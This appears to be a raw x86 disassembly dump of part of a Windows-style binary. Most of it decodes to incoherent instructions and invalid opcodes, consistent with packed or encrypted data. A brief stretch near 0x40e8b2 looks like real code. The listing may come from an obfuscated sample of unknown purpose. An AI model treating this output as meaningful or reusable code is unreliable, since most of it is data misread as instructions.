  40e573:	call   0x7886:0x579b6429
  40e57a:	and    al,0xc0
  40e57c:	sub    DWORD PTR [ebx],edx
  40e57e:	push   esp
  40e57f:	fisubr DWORD PTR [edi+0x5e]
  40e582:	fisubr DWORD PTR [edx]
  40e584:	pop    es
  40e585:	pop    es
  40e586:	mov    dl,0xe9
  40e588:	ds ds dec edx
  40e58b:	jo     0x40e58a
  40e58d:	mov    bh,0xcc
  40e58f:	mov    ebx,0x73355235
  40e594:	enter  0x4adb,0xf4
  40e598:	iret   
  40e599:	sub    dl,BYTE PTR [edx+eiz*1+0x32905708]
  40e5a0:	and    bl,BYTE PTR [edx-0x17]
  40e5a3:	lods   al,BYTE PTR ds:[esi]
  40e5a4:	mov    cl,0x1d
  40e5a6:	(bad)  
  40e5a7:	mov    ch,0xb4
  40e5a9:	ds in  eax,0xa3
  40e5ac:	neg    dl
  40e5ae:	jne    0x40e5d8
  40e5b0:	mov    esi,0x66426569
  40e5b5:	jo     0x40e609
  40e5b7:	mov    gs,WORD PTR ss:[ebp+0x10]
  40e5bb:	loopne 0x40e543
  40e5bd:	dec    eax
  40e5be:	lods   eax,DWORD PTR ds:[esi]
  40e5bf:	js     0x40e5a9
  40e5c1:	dec    esp
  40e5c2:	out    dx,al
  40e5c3:	jmp    0x40e591
  40e5c5:	cmp    al,0xf3
  40e5c7:	fsubp  st(2),st
  40e5c9:	and    esi,DWORD PTR [eax]
  40e5cb:	sub    bl,BYTE PTR [ecx+ebx*2+0x77]
  40e5cf:	arpl   WORD PTR [edi],ax
  40e5d1:	dec    edi
  40e5d2:	mov    eax,ds:0xb0a97b3e
  40e5d7:	cld    
  40e5d8:	scas   eax,DWORD PTR es:[edi]
  40e5d9:	jle    0x40e5f3
  40e5db:	sbb    dl,dl
  40e5dd:	shl    BYTE PTR [edi],0xf0
  40e5e0:	in     al,0xae
  40e5e2:	sti    
  40e5e3:	lea    ecx,[eax]
  40e5e5:	cmc    
  40e5e6:	xchg   edi,eax
  40e5e7:	pop    ss
  40e5e8:	sub    eax,0x4025135e
  40e5ed:	dec    esi
  40e5ee:	dec    bp
  40e5f0:	mov    al,ds:0x281ff9e2
  40e5f5:	pop    ebx
  40e5f6:	jg     0x40e5c8
  40e5f8:	(bad)  
  40e5f9:	(bad)  
  40e5fa:	fdiv   st,st(6)
  40e5fc:	cld    
  40e5fd:	xchg   BYTE PTR [edx+esi*2-0x553ce2c],bh
  40e604:	stc    
  40e605:	test   al,0x8f
  40e607:	outs   dx,BYTE PTR ds:[esi]
  40e608:	es xchg ebp,eax
  40e60a:	stc    
  40e60b:	retf   0x2cb7
  40e60e:	hlt    
  40e60f:	(bad)  
  40e610:	out    0x68,al
  40e612:	jns    0x40e647
  40e614:	(bad)  
  40e615:	xor    al,0x0
  40e617:	sbb    BYTE PTR [esi],ah
  40e619:	pop    edi
  40e61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e61b:	les    ecx,FWORD PTR [eax+esi*1-0x66]
  40e61f:	inc    ebx
  40e620:	adc    cl,dh
  40e622:	dec    ecx
  40e623:	int3   
  40e624:	sbb    esi,DWORD PTR [edi+0x2d7f7d1f]
  40e62a:	js     0x40e610
  40e62c:	xchg   ebp,eax
  40e62d:	in     al,0xbf
  40e62f:	sub    DWORD PTR [eax-0x3a],ebp
  40e632:	inc    eax
  40e633:	jns    0x40e5ea
  40e635:	mov    edi,0x994ddb89
  40e63a:	adc    eax,0x1dceea3d
  40e63f:	in     al,0x17
  40e641:	mov    al,0xe0
  40e643:	push   ebx
  40e644:	aaa    
  40e645:	not    BYTE PTR ds:0xb53bcf41
  40e64b:	hlt    
  40e64c:	cmp    edx,DWORD PTR [eax]
  40e64e:	pusha  
  40e64f:	xchg   ecx,eax
  40e650:	repz xor BYTE PTR [eax+eiz*1],bl
  40e654:	rol    DWORD PTR es:[edi-0x138479b0],1
  40e65b:	mov    esi,0x2d5a98b8
  40e660:	mov    dl,0x32
  40e662:	inc    esp
  40e663:	and    ebx,DWORD PTR [edx-0x5d]
  40e666:	jne    0x40e61b
  40e668:	sbb    BYTE PTR ds:0x3f561b15,cl
  40e66e:	rcl    DWORD PTR [edi+ebx*2+0x30],cl
  40e672:	push   ebp
  40e673:	pop    edx
  40e674:	enter  0xd047,0x22
  40e678:	outs   dx,DWORD PTR ds:[esi]
  40e679:	cld    
  40e67a:	fdivr  DWORD PTR [ebp+0x5b]
  40e67d:	sbb    BYTE PTR [ebx],0x5c
  40e680:	dec    eax
  40e681:	and    edi,DWORD PTR [ebp+0x5f69d2d3]
  40e687:	pushf  
  40e688:	out    0x2c,eax
  40e68a:	inc    ebp
  40e68b:	add    eax,0x5d4f97b2
  40e690:	out    0x2a,eax
  40e692:	(bad)  
  40e694:	pop    es
  40e695:	push   eax
  40e696:	sub    eax,0x40ec82ab
  40e69b:	mov    bl,bl
  40e69d:	retf   0xb7dc
  40e6a0:	push   0x644497b
  40e6a5:	or     eax,0xc2a8ea6
  40e6aa:	bound  ebx,QWORD PTR [esi+0x49]
  40e6ad:	imul   BYTE PTR [ebx-0x34208740]
  40e6b3:	icebp  
  40e6b4:	mov    ds,WORD PTR [esi]
  40e6b6:	pusha  
  40e6b7:	mov    cl,0xfb
  40e6b9:	or     eax,0x4dad06ad
  40e6be:	pop    ebx
  40e6bf:	call   0x4094f44e
  40e6c4:	cli    
  40e6c5:	and    DWORD PTR gs:[eax+0x1002235f],ecx
  40e6cc:	lea    ebp,[eax+0x3f6d8e62]
  40e6d2:	dec    ebx
  40e6d3:	(bad)
  40e6d7:	jmp    0x7e6b:0x6430460f
  40e6de:	dec    cl
  40e6e0:	jg     0x40e6b0
  40e6e2:	popa   
  40e6e3:	sti    
  40e6e4:	adc    ebx,DWORD PTR [edx-0x42]
  40e6e7:	dec    edx
  40e6e8:	icebp  
  40e6e9:	mov    edx,0x24675b64
  40e6ee:	cli    
  40e6ef:	pop    ecx
  40e6f0:	fadd   QWORD PTR [ebx+0x6df100c0]
  40e6f6:	sar    bl,1
  40e6f8:	shl    BYTE PTR [ebx],1
  40e6fa:	imul   ebx,DWORD PTR [ebx*8-0x14f43240],0x1dd64df
  40e705:	cli    
  40e706:	in     al,0x40
  40e708:	(bad)  
  40e709:	stos   BYTE PTR es:[edi],al
  40e70a:	xchg   esp,eax
  40e70b:	mov    edx,0xd438bad0
  40e710:	mov    BYTE PTR ds:0x5bebf26f,cl
  40e716:	xlat   BYTE PTR ds:[ebx]
  40e717:	retf   
  40e718:	loope  0x40e6ec
  40e71a:	xor    ch,BYTE PTR [ebx-0x1f]
  40e71d:	icebp  
  40e71e:	push   0x56ee04bb
  40e723:	pop    eax
  40e724:	ja     0x40e790
  40e726:	pop    edi
  40e727:	push   ebx
  40e728:	rcl    DWORD PTR [ebp+0x54],1
  40e72b:	pop    ebp
  40e72c:	test   eax,0xd47a9445
  40e731:	mov    dl,0xf7
  40e733:	ret    
  40e734:	jb     0x40e738
  40e736:	adc    cl,BYTE PTR [ebp-0x17558ff3]
  40e73c:	shr    ebp,0x6c
  40e73f:	cmc    
  40e740:	gs jne 0x40e786
  40e743:	cmp    eax,0x4db874e1
  40e748:	(bad)  
  40e749:	adc    esi,ebp
  40e74b:	stos   DWORD PTR es:[edi],eax
  40e74c:	lahf   
  40e74d:	jmp    0xc98dc6a5
  40e752:	test   eax,0xf5b003bd
  40e757:	mov    ebx,0xa11314c5
  40e75c:	nop
  40e75d:	mov    al,ds:0xb33f7ff7
  40e762:	cld    
  40e763:	or     al,al
  40e765:	jns    0x40e7c2
  40e767:	cmc    
  40e768:	xchg   ebx,eax
  40e769:	push   esp
  40e76a:	popa   
  40e76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e76c:	pop    edi
  40e76d:	and    al,0xb2
  40e76f:	sub    esi,esp
  40e771:	sub    BYTE PTR [ebx],bh
  40e773:	les    ecx,FWORD PTR [ebx+0x2b]
  40e776:	push   esi
  40e777:	aam    0x23
  40e779:	mov    esi,0x3eee95c
  40e77e:	pop    esp
  40e77f:	aaa    
  40e780:	test   al,0x42
  40e782:	add    edx,ebp
  40e784:	add    DWORD PTR [ebp-0x1a],ecx
  40e787:	jbe    0x40e747
  40e789:	push   esi
  40e78a:	imul   ecx,DWORD PTR [esi-0x1d40ad63],0x58a82110
  40e794:	addr16 jnp 0x40e790
  40e797:	pusha  
  40e798:	jb     0x40e7cc
  40e79a:	retf   0xb724
  40e79d:	dec    edx
  40e79e:	push   0x1b9c552e
  40e7a3:	sbb    al,0xc3
  40e7a5:	repz in eax,0xb4
  40e7a8:	call   0x5a15:0x7cf0a1e
  40e7af:	(bad)  
  40e7b1:	test   al,0xc6
  40e7b3:	sub    cl,dl
  40e7b5:	hlt    
  40e7b6:	dec    edx
  40e7b7:	add    DWORD PTR [eax],0xffffff90
  40e7ba:	and    DWORD PTR [edx+0x2d],0xc7083be5
  40e7c1:	lea    edx,[esp+edi*8]
  40e7c4:	out    0x60,eax
  40e7c6:	inc    ecx
  40e7c7:	push   0x744a9607
  40e7cc:	ret    0x706f
  40e7cf:	stos   DWORD PTR es:[edi],eax
  40e7d0:	cmp    edi,ebx
  40e7d2:	bnd ret 0x955d
  40e7d6:	jmp    0x40e845
  40e7d8:	iret   
  40e7d9:	minps  xmm3,xmm1
  40e7dc:	xchg   edx,eax
  40e7dd:	sbb    DWORD PTR [esi-0x740bb01c],ebp
  40e7e3:	fwait
  40e7e4:	jnp    0x40e78b
  40e7e6:	bound  ebp,QWORD PTR [ecx+0x64]
  40e7e9:	sbb    BYTE PTR [edx+0x20a3e91f],dl
  40e7ef:	xor    bh,BYTE PTR [ebp-0x7cf1fe28]
  40e7f5:	xor    al,0x4e
  40e7f7:	ss xor eax,0xcadae614
  40e7fd:	inc    eax
  40e7fe:	push   eax
  40e7ff:	hlt    
  40e800:	data16 loope 0x40e787
  40e803:	ja     0x40e7b7
  40e805:	inc    edx
  40e806:	sbb    BYTE PTR [edx+0xd53f9f0],dh
  40e80c:	mov    ebx,0xda38e2df
  40e811:	imul   eax,DWORD PTR [edi],0x38
  40e814:	dec    ebx
  40e815:	push   es
  40e816:	or     BYTE PTR [esi+0x5f],bh
  40e819:	xchg   ecx,eax
  40e81a:	jnp    0x40e885
  40e81c:	inc    esi
  40e81d:	aad    0xdb
  40e81f:	cmp    BYTE PTR fs:[edx-0x2335ab92],bh
  40e826:	mov    edx,0xf328ada6
  40e82b:	push   eax
  40e82c:	jle    0x40e88f
  40e82e:	jb     0x40e811
  40e830:	sub    BYTE PTR [ecx],cl
  40e832:	cdq    
  40e833:	add    ecx,DWORD PTR [esi-0x5f]
  40e836:	popf   
  40e837:	dec    esp
  40e838:	pusha  
  40e839:	cwde   
  40e83a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e83b:	jge    0x40e897
  40e83d:	xlat   BYTE PTR ds:[ebx]
  40e83e:	outs   dx,BYTE PTR ds:[esi]
  40e83f:	push   ebp
  40e840:	inc    esp
  40e841:	xchg   edi,eax
  40e842:	cwde   
  40e843:	mov    esi,fs
  40e845:	imul   esp,DWORD PTR [edi+0x6c],0x62
  40e849:	cmp    ch,dh
  40e84b:	xchg   ecx,eax
  40e84c:	adc    DWORD PTR ss:[eax-0x1c],ebp
  40e850:	arpl   WORD PTR [eax],ax
  40e852:	mov    ds:0xda6a58a,eax
  40e857:	pop    eax
  40e858:	xor    cl,dl
  40e85a:	adc    eax,0x405600b3
  40e85f:	and    DWORD PTR [edi+0x6bbf4a9f],edi
  40e865:	adc    dl,BYTE PTR [ebx]
  40e867:	mov    dl,0x4b
  40e869:	gs cmp bl,bl
  40e86c:	mov    ch,BYTE PTR [edx+0x47]
  40e86f:	jne    0x40e8b8
  40e871:	mov    ds:0xf1647d53,al
  40e876:	mov    ah,0x12
  40e878:	shr    BYTE PTR [eax],1
  40e87a:	inc    ebp
  40e87b:	in     eax,dx
  40e87c:	sar    BYTE PTR [eax-0x12e9bd15],1
  40e882:	loopne 0x40e8f4
  40e884:	push   ebx
  40e885:	sbb    cl,0xa
  40e888:	dec    edx
  40e889:	(bad)  
  40e88b:	mov    ch,0x3c
  40e88d:	pop    es
  40e88e:	xchg   ecx,eax
  40e88f:	adc    dh,bh
  40e891:	aas    
  40e892:	sub    eax,0xb523865e
  40e897:	test   al,0xc5
  40e899:	dec    eax
  40e89a:	sub    BYTE PTR [esi-0x741fb275],0x35
  40e8a1:	push   ebp
  40e8a2:	inc    esp
  40e8a3:	inc    ebx
  40e8a4:	add    BYTE PTR [ebx-0x61caceca],cl
  40e8aa:	inc    ebx
  40e8ab:	inc    ebx
  40e8ac:	add    BYTE PTR [esi+0x7510855],bh
  40e8b2:	xor    DWORD PTR ds:0x4343a2,0x4326ec
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432dc2,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434411,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432dc2,0x4326f8
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	(bad)  
  40e903:	ss out dx,al
  40e905:	inc    ecx
  40e906:	sub    ebx,DWORD PTR [edx+0x7d497070]
  40e90c:	jo     0x40e97e
  40e90e:	cwde   
  40e90f:	mov    DWORD PTR [ecx],ecx
  40e911:	or     bl,BYTE PTR [esi]
  40e913:	jp     0x40e974
  40e915:	(bad)  
  40e916:	retf   
  40e917:	xchg   ecx,esi
  40e919:	es mov ?,edx
  40e91c:	and    dh,BYTE PTR [edx]
  40e91e:	jmp    0x3daa:0xa3692318
  40e925:	retf   0x6000
  40e928:	in     al,dx
  40e929:	loopne 0x40e8bb
  40e92b:	xchg   bx,ax
  40e92d:	xchg   edi,eax
  40e92e:	shl    BYTE PTR ds:0x22902f21,0xd8
  40e935:	xor    BYTE PTR [ecx+0x8],0xda
  40e939:	mov    ah,0x9f
  40e93b:	in     eax,0xe5
  40e93d:	test   BYTE PTR [ebx+eax*8+0x77],cl
  40e941:	adc    al,0x4
  40e943:	cmp    eax,0x7cf8e899
  40e948:	push   ebx
  40e949:	jge    0x40e997
  40e94b:	rol    BYTE PTR [eax],1
  40e94d:	pop    ebp
  40e94e:	cmc    
  40e94f:	mov    ch,0x24
  40e951:	cmp    BYTE PTR [ebx-0x543eff5d],bh
  40e957:	pop    eax
  40e958:	xlat   BYTE PTR ds:[ebx]
  40e959:	lahf   
  40e95a:	xchg   ecx,eax
  40e95b:	push   cs
  40e95c:	jmp    0x1543:0xa3a87f
  40e963:	(bad)  
  40e964:	push   esp
  40e965:	aad    0x49
  40e967:	ins    DWORD PTR es:[edi],dx
  40e968:	retf   0xd96c
  40e96b:	xchg   ebp,eax
  40e96c:	xlat   BYTE PTR ds:[ebx]
  40e96d:	(bad)  
  40e96f:	xchg   esp,eax
  40e970:	mov    eax,0xc8699b87
  40e975:	ficom  WORD PTR [ecx]
  40e977:	adc    ebp,DWORD PTR [eax+0x29e05751]
  40e97d:	dec    ecx
  40e97e:	scas   al,BYTE PTR es:[edi]
  40e97f:	jge    0x40e953
  40e981:	mov    dl,0xde
  40e983:	add    DWORD PTR [edi*8-0x7247a8b7],ecx
  40e98a:	xor    al,0x9a
  40e98c:	and    ecx,edi
  40e98e:	cwde   
  40e98f:	(bad)  
  40e990:	div    DWORD PTR [edi+0xe27bc2b]
  40e996:	call   FWORD PTR [edi+0x7b9949a1]
  40e99c:	adc    DWORD PTR [edx],eax
  40e99e:	fucomp st(6)
  40e9a0:	out    dx,al
  40e9a1:	xchg   esi,eax
  40e9a2:	loop   0x40e9bd
  40e9a4:	popf   
  40e9a5:	repz mov bl,0xf6
  40e9a8:	mov    al,0x21
  40e9aa:	out    0xf7,eax
  40e9ac:	shr    BYTE PTR [ecx],1
  40e9ae:	mov    DWORD PTR [esi+0x78739bac],eax
  40e9b4:	or     al,0x8f
  40e9b6:	leave  
  40e9b7:	cdq    
  40e9b8:	ret    
  40e9b9:	repz clc 
  40e9bb:	imul   ebx,DWORD PTR [esp+edi*1-0x6a],0xffffff8b
  40e9c0:	lock test DWORD PTR [ecx-0x40],edi
  40e9c4:	mov    edi,0x26341ed0
  40e9c9:	cmp    bl,BYTE PTR [ebx+eiz*2+0x13]
  40e9cd:	xchg   edi,eax
  40e9ce:	mov    dl,0x76
  40e9d0:	sbb    BYTE PTR ds:0x310d95ff,0x42
  40e9d7:	das    
  40e9d8:	mov    BYTE PTR [ebx+ebp*2+0x10],cl
  40e9dc:	(bad)  
  40e9dd:	icebp  
  40e9de:	fcom   QWORD PTR [edi+ebp*8-0x47]
  40e9e2:	out    dx,al
  40e9e3:	(bad)  
  40e9e4:	(bad)  
  40e9e5:	int    0xd0
  40e9e7:	xor    BYTE PTR [ecx],cl
  40e9e9:	xor    al,0x89
  40e9eb:	std    
  40e9ec:	js     0x40ea10
  40e9ee:	jns    0x40e9f2
  40e9f0:	je     0x40ea3e
  40e9f2:	inc    BYTE PTR [ecx+ecx*2]
  40e9f5:	pop    edx
  40e9f6:	mov    bl,0x17
  40e9f8:	iret   
  40e9f9:	jo     0x40e9fd
  40e9fb:	in     eax,dx
  40e9fc:	stc    
  40e9fd:	pop    ds
  40e9fe:	out    0x26,al
  40ea00:	jns    0x40e99e
  40ea02:	nop
  40ea03:	stc    
  40ea04:	inc    ecx
  40ea05:	xchg   ecx,eax
  40ea06:	dec    eax
  40ea07:	adc    eax,esi
  40ea09:	daa    
  40ea0a:	sar    BYTE PTR [edi-0x17],0xf4
  40ea0e:	xchg   ecx,eax
  40ea0f:	leave  
  40ea10:	pop    edx
  40ea11:	xchg   ebx,esp
  40ea13:	dec    esp
  40ea14:	aas    
  40ea15:	and    DWORD PTR [edi-0x2b8d2d9c],ecx
  40ea1b:	or     eax,ebx
  40ea1d:	ins    DWORD PTR es:[edi],dx
  40ea1e:	mov    edx,edi
  40ea20:	mov    esp,0xb54b49db
  40ea25:	cmp    DWORD PTR [ebx+edi*1-0x7b],esp
  40ea29:	aam    0xd0
  40ea2b:	inc    ebp
  40ea2c:	or     edi,DWORD PTR [ecx+0x4b]
  40ea2f:	rcl    dh,0x31
  40ea32:	(bad)  
  40ea33:	call   0x3529:0xedb09b3e
  40ea3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea3b:	ins    BYTE PTR es:[edi],dx
  40ea3c:	pusha  
  40ea3d:	jns    0x40e9c7
  40ea3f:	rcr    BYTE PTR [eax],cl
  40ea41:	xchg   ecx,eax
  40ea42:	in     al,dx
  40ea43:	and    BYTE PTR [edx-0x6],bh
  40ea46:	scas   eax,DWORD PTR es:[edi]
  40ea47:	push   edx
  40ea48:	fwait
  40ea49:	imul   ebp,DWORD PTR [ebx],0x19
  40ea4c:	lds    ebp,FWORD PTR [ebx+edi*8]
  40ea4f:	push   edi
  40ea50:	push   esp
  40ea51:	dec    esp
  40ea52:	xchg   edx,eax
  40ea53:	inc    ebp
  40ea54:	mov    ah,BYTE PTR [esp+edx*8+0x6a]
  40ea58:	dec    ebp
  40ea59:	and    esp,DWORD PTR [eax+ebp*4]
  40ea5c:	nop
  40ea5d:	shl    BYTE PTR [esi+eax*1-0x6d],1
  40ea61:	ins    DWORD PTR es:[edi],dx
  40ea62:	mov    eax,0xb3ec410f
  40ea67:	lods   eax,DWORD PTR ds:[esi]
  40ea68:	ss data16 add al,0x55
  40ea6d:	lock add DWORD PTR [ecx+0x27],0xffffffa2
  40ea72:	inc    BYTE PTR [ebx-0x519fd2f5]
  40ea78:	add    dh,BYTE PTR [edx-0x6f70609d]
  40ea7e:	leave  
  40ea7f:	jle    0x40ea56
  40ea81:	and    BYTE PTR [esi],al
  40ea83:	outs   dx,DWORD PTR ds:[esi]
  40ea84:	mov    ebx,eax
  40ea86:	dec    ebp
  40ea87:	dec    edi
  40ea88:	adc    ecx,DWORD PTR [edx-0x2dab7274]
  40ea8e:	jno    0x40ea73
  40ea90:	and    esp,eax
  40ea92:	push   esi
  40ea93:	pop    esi
  40ea94:	das    
  40ea95:	test   eax,0x1aa1679b
  40ea9a:	inc    ecx
  40ea9b:	or     al,0x95
  40ea9d:	mov    eax,0x1c39a37d
  40eaa2:	cdq    
  40eaa3:	push   esp
  40eaa4:	in     al,0x57
  40eaa6:	pop    ss
  40eaa7:	adc    al,0x78
  40eaa9:	out    0xc5,eax
  40eaab:	push   ecx
  40eaac:	inc    ebp
  40eaad:	inc    edx
  40eaae:	jp     0x40eaff
  40eab0:	mov    ds:0x1d202532,al
  40eab5:	es test eax,0x67c31a57
  40eabb:	and    DWORD PTR [ebx+0x0],ecx
  40eabe:	mov    al,0x3b
  40eac0:	jns    0x40ea63
  40eac2:	mov    BYTE PTR [edi+0x596d9de6],bl
  40eac8:	retf   
  40eac9:	sbb    BYTE PTR [edx],0x90
  40eacc:	jmp    0x40eb15
  40eace:	mov    ch,0x35
  40ead0:	or     eax,0xf01c1ad8
  40ead5:	cdq    
  40ead6:	mov    ds:0x564cfc83,al
  40eadb:	sub    edi,DWORD PTR [edx+0x4bed70cc]
  40eae1:	push   ebx
  40eae2:	imul   DWORD PTR [edx+0x3a6c97e2]
  40eae8:	inc    ecx
  40eae9:	push   cs
  40eaea:	pop    ds
  40eaeb:	outs   dx,BYTE PTR ds:[esi]
  40eaec:	jg     0x40eae9
  40eaee:	adc    eax,0x9fff641f
  40eaf3:	xor    al,0x5f
  40eaf5:	add    BYTE PTR [edx],ch
  40eaf7:	sub    DWORD PTR ds:0x17865914,0xb
  40eafe:	stc    
  40eaff:	and    esp,DWORD PTR [esi]
  40eb01:	push   cs
  40eb02:	mov    bl,BYTE PTR [esp+edi*8+0x77]
  40eb06:	lods   eax,DWORD PTR ds:[esi]
  40eb07:	xchg   ebp,eax
  40eb08:	xchg   esi,eax
  40eb09:	pop    ebx
  40eb0a:	dec    eax
  40eb0b:	stos   BYTE PTR es:[edi],al
  40eb0c:	sbb    eax,0x86d6d750
  40eb11:	pop    esi
  40eb12:	les    esp,FWORD PTR [esi]
  40eb14:	xchg   DWORD PTR [ebx+0x3fa5a010],ebp
  40eb1a:	fadd   DWORD PTR [ebx-0x78]
  40eb1d:	ficom  DWORD PTR [edi+0x5d4c6d3f]
  40eb23:	jbe    0x40eada
  40eb25:	or     ch,BYTE PTR [esi-0x667944cf]
  40eb2b:	bound  edi,QWORD PTR [edi-0x6b]
  40eb2e:	jno    0x40eb61
  40eb30:	xor    eax,0x9ab2b764
  40eb35:	stos   BYTE PTR es:[edi],al
  40eb36:	jae    0x40eb58
  40eb38:	mov    eax,DWORD PTR [eax+0x7e09a077]
  40eb3e:	and    edx,DWORD PTR [ebx+0x44e795f]
  40eb44:	xchg   ebp,eax
  40eb45:	jo     0x40eafd
  40eb47:	cmp    bh,BYTE PTR [esi-0x2]
  40eb4a:	loopne 0x40eb01
  40eb4c:	loopne 0x40eb68
  40eb4e:	mov    ebx,0x96281422
  40eb53:	and    eax,0xff7e5fe6
  40eb58:	shl    BYTE PTR [ecx-0x10246d],1
  40eb5e:	add    ah,bl
  40eb60:	jnp    0x40eae9
  40eb62:	cmp    ah,bl
  40eb64:	outs   dx,DWORD PTR ds:[esi]
  40eb65:	gs std 
  40eb67:	into   
  40eb68:	inc    edx
  40eb69:	jmp    0x40eb41
  40eb6b:	add    esi,DWORD PTR [ebx+esi*2]
  40eb6e:	mov    DWORD PTR [ebp+0x3e440b8f],edi
  40eb74:	ret    0x640e
  40eb77:	ds std 
  40eb79:	test   edi,ebp
  40eb7b:	sub    eax,0x6661a114
  40eb80:	dec    ebp
  40eb81:	dec    edx
  40eb82:	inc    esi
  40eb83:	inc    eax
  40eb84:	aam    0xdd
  40eb86:	or     BYTE PTR [edi+edx*8+0x5e],ah
  40eb8a:	push   0xa8f9aa66
  40eb8f:	pop    es
  40eb90:	lods   eax,DWORD PTR ds:[esi]
  40eb91:	inc    edi
  40eb92:	push   cs
  40eb93:	mov    dl,0x70
  40eb95:	pop    esp
  40eb96:	and    al,0x98
  40eb98:	mov    al,0x2
  40eb9a:	test   BYTE PTR [ecx],bl
  40eb9c:	scas   al,BYTE PTR es:[edi]
  40eb9d:	out    0xdd,eax
  40eb9f:	push   ecx
  40eba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eba1:	iretw  
  40eba3:	cmp    edi,edi
  40eba5:	rcl    DWORD PTR [ebp-0x6b],0x4b
  40eba9:	mov    al,ds:0xc53dcd82
  40ebae:	fdivr  DWORD PTR [esi+ecx*8]
  40ebb1:	xor    ebp,DWORD PTR [edx-0x5dddb2c9]
  40ebb7:	inc    ebp
  40ebb8:	or     al,0x2f
  40ebba:	jmp    0x430166b
  40ebbf:	fst    DWORD PTR [ecx+0x2a]
  40ebc2:	iret   
  40ebc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebc4:	pop    ebp
  40ebc5:	or     esp,ebp
  40ebc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebc8:	idiv   DWORD PTR ds:0x653272e4
  40ebce:	mov    bh,0xad
  40ebd0:	lea    ebx,[eax-0x4cbb599d]
  40ebd6:	push   esi
  40ebd7:	inc    edx
  40ebd8:	rol    BYTE PTR [esi+0x6c95fd],1
  40ebde:	loop   0x40ec53
  40ebe0:	outs   dx,DWORD PTR ds:[esi]
  40ebe1:	cmp    ebp,esp
  40ebe3:	dec    esi
  40ebe4:	nop
  40ebe5:	shl    BYTE PTR [ebx-0x76cc09d7],0x9e
  40ebec:	jnp    0x40eb9f
  40ebee:	std    
  40ebef:	adc    ebx,DWORD PTR [ecx+0x789cf1e4]
  40ebf5:	pop    ss
  40ebf6:	in     al,0x6a
  40ebf8:	popf   
  40ebf9:	mov    ch,0x9c
  40ebfb:	dec    ecx
  40ebfc:	xchg   esp,eax
  40ebfd:	hlt    
  40ebfe:	gs pop ds
  40ec00:	add    dh,BYTE PTR [eax+0x5b]
  40ec03:	adc    ebx,ebp
  40ec05:	loopne 0x40ec2a
  40ec07:	push   0xffffffcd
  40ec09:	inc    esp
  40ec0a:	call   0xa5fe22c1
  40ec0f:	ja     0x40ec11
  40ec11:	cmp    dh,BYTE PTR [ebp-0x70]
  40ec14:	dec    ecx
  40ec15:	mov    cl,0x1a
  40ec17:	rcl    ebp,0x65
  40ec1a:	inc    ecx
  40ec1b:	mov    DWORD PTR [esi-0x23aa02ba],esp
  40ec21:	mov    eax,ds:0xff8c45ac
  40ec26:	mov    cl,0x54
  40ec28:	sbb    DWORD PTR [eax],eax
  40ec2a:	(bad)  
  40ec2b:	(bad)  
  40ec2c:	mov    edx,0x3ed60e4b
  40ec31:	retf   0x57e2
  40ec34:	cwde   
  40ec35:	pop    esi
  40ec36:	push   edi
  40ec37:	mov    ebx,0x1fabef42
  40ec3c:	cwde   
  40ec3d:	add    DWORD PTR [ebx+0x6a06a44],ecx
  40ec43:	outs   dx,DWORD PTR ds:[esi]
  40ec44:	push   ecx
  40ec45:	ins    BYTE PTR es:[edi],dx
  40ec46:	mov    ecx,?
  40ec48:	adc    eax,0x19f41e6d
  40ec4d:	push   esi
  40ec4e:	fist   DWORD PTR [edi]
  40ec50:	dec    eax
  40ec51:	fld    st(5)
  40ec53:	cmp    ch,ah
  40ec55:	rol    esp,0xfd
  40ec58:	js     0x40ec39
  40ec5a:	mov    al,ds:0x80d2e39d
  40ec5f:	xlat   BYTE PTR ds:[ebx]
  40ec60:	imul   ebx,DWORD PTR [ebx+0x44be4c2c],0xce7560ea
  40ec6a:	ss ja  0x40ec1e
  40ec6d:	adc    edi,DWORD PTR ds:0x917f3cd7
  40ec73:	repnz mov ah,0xef
  40ec76:	cmp    al,0x5a
  40ec78:	dec    edx
  40ec79:	xchg   esp,eax
  40ec7a:	xchg   ebx,eax
  40ec7b:	sub    al,ch
  40ec7d:	dec    edx
  40ec7f:	inc    esp
  40ec80:	mov    ds:0x91ea345b,al
  40ec85:	lds    esi,FWORD PTR [ebx+ebx*2-0x17]
  40ec89:	retf   0xa3ae
  40ec8c:	sbb    BYTE PTR [esi],bl
  40ec8e:	iret   
  40ec8f:	xor    ebx,DWORD PTR [ecx+0x48]
  40ec92:	sub    BYTE PTR [edi-0x43a61667],bl
  40ec98:	ficomp DWORD PTR [edi+ecx*4-0x7b]
  40ec9c:	add    al,0xae
  40ec9e:	cmp    eax,0x6fc369ac
  40eca3:	adc    al,0xe7
  40eca5:	ja     0x40ec32
  40eca7:	mov    ecx,0x13db1113
  40ecac:	ficom  DWORD PTR [eax]
  40ecae:	aam    0x64
  40ecb0:	add    esi,ebx
  40ecb2:	arpl   WORD PTR [edx],cx
  40ecb4:	dec    eax
  40ecb5:	xchg   ebp,eax
  40ecb6:	pop    edx
  40ecb7:	lahf   
  40ecb8:	repz adc eax,0xbd402fbb
  40ecbe:	dec    ebp
  40ecbf:	shr    DWORD PTR ds:[ebp+0x2],1
  40ecc3:	loope  0x40ed04
  40ecc5:	enter  0xd524,0xe7
  40ecc9:	popf   
  40ecca:	xchg   esp,eax
  40eccb:	mov    eax,ds:0x1cccb014
  40ecd0:	adc    eax,0x6c1ea2ef
  40ecd5:	add    eax,0xb7c0e4b7
  40ecda:	sbb    ch,BYTE PTR [edi]
  40ecdc:	pop    es
  40ecdd:	mov    ch,0xbd
  40ecdf:	cmp    cl,BYTE PTR [edi-0x582b0600]
